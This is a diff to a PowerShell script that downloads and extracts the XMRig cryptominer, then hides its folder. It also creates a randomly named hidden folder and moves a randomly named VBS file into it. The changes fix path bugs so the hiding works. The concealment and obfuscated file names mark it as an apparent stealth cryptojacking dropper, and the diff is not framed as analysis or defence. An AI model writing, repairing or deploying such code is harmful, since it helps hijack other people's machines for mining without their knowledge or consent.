@@ -96,7 +96,7 @@ $currentDir = $Pwd
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
-Set-ItemProperty -Path "initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"
+Set-ItemProperty -Path "$initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"
 
 # Replace XMRig Configuration File
 $newConfigPath = "$path\config.json"
@@ -192,7 +192,9 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 mkdir $initial_dir\esSDyVlwHITj
 
-attrib +h "initial_dir\esSDyVlwHITj"
+Set-ItemProperty -Path "$initial_dir\esSDyVlwHITj" -Name Attributes -Value "Hidden"
+
+#attrib +h "initial_dir\esSDyVlwHITj"
 
 Move-Item -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Destination $initial_dir\esSDyVlwHITj
 
